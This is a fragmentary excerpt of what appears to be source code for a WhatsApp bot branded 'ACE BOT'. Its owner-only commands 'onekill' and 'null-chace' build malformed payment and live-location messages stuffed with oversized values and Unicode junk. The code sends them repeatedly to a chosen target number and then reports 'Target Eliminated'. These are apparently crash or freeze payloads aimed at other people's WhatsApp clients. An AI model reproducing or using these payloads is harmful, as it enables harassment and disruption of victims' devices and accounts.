    ...
    "interactiveMessage": {
      ...
      "nativeFlowMessage": {
        "buttons": [
          {
            "name": "review_and_pay",
            "buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🖤⟩ ༘྅Ⓐϲе Bot Territory ꧏ🉑 ༑\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
      }
    }
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "🖤⟩ ༘྅Ⓐϲе Bot Territory ꧏ🤍҈ ༑",
...
//=================================================//
case 'onekill': {
if (!isCreator) return reply("Only 𒋨🏴‍☠️⃝𝘼𝘾𝙀☠️𝘽𝙊𝙏⃝𒋨🉑 owner can use this command")
...
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
    \`𒋨🏴‍☠️⃝𝘼𝘾𝙀☠️𝘽𝙊𝙏⃝𒋨🉑\`
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
   ✰ 𝐒𝐜 𝐏𝐮𝐛𝐥𝐢𝐜 ❴ 𝐵𝑌 ན🏴‍☠️⃝🅐ϲԑ 𝚔𝖎𝐫қ ❬𝕯❭ ❵
   ✰ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫: ན🏴‍☠️⃝🅐ϲԑ 𝚔𝖎𝐫қ ❬𝕯❭
...
global.logo = "https://telegra.ph/file/c9f1fbd5b78d902762e5f.jpg"
...
image: cewegw, 
  ...
  thumbnail:hinachan,
  mediaType: 4,
  MediaUrl:`https://telegra.ph/file/c9f1fbd5b78d902762e5f.jpg`,
...
jumlah = q.split(",")[1]
hmbug(sendto, 𒋨🏴‍☠️⃝𝘼𝘾𝙀☠️𝘽𝙊𝙏⃝𒋨🉑 ...~${ios1}`)
await sleep(5000)
hmbug(sendto, `𒋨🏴‍☠️⃝𝘼𝘾𝙀☠️𝘽𝙊𝙏⃝𒋨🉑${ios1}`)
await sleep(5000)
...
await reply('💊𝗧𝗮𝗿𝗴𝗲𝘁 𝗘𝗹𝗶𝗺𝗶𝗻𝗮𝘁𝗲𝗱 𝗯𝘆 𒋨🏴‍☠️⃝𝘼𝘾𝙀☠️𝘽𝙊𝙏⃝𒋨🉑 📡')
}
break
//=================================================
case 'null-chace': {
...
body: `⁗ 𒋨🏴‍☠️⃝𝘼𝘾𝙀☠️𝘽𝙊𝙏⃝𒋨🉑 𝕰𝖑𝖎𝖒𝖎𝖓𝖆𝖙𝖊𝖘 📡`,
previewType: "VIDEO",
...
text: '📡𝗬𝗼𝘂 𝗖𝗮𝗻 𝗖𝗼𝗽𝘆 𝗕𝘂𝘁 𝗬𝗼𝘂 𝗖𝗮𝗻𝘁 𝗯𝗲 𝗠𝗲 🙃 𝗖𝗮𝗹𝗹 𝗠𝗲 ན🏴‍☠️⃝🅐ϲԑ 𝚔𝖎𝐫қ ❬𝕯❭🩸'
}, {
quoted: m
})
}
...
case 'antilinkgc': {
        ...
        if (args[0] === "on") {
          ...
          zetsubo.sendMessage(from, { text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink Activated!`, contextInfo: { mentionedJid: mems } }, { quoted: m })
        } else if (args[0] === "off") {
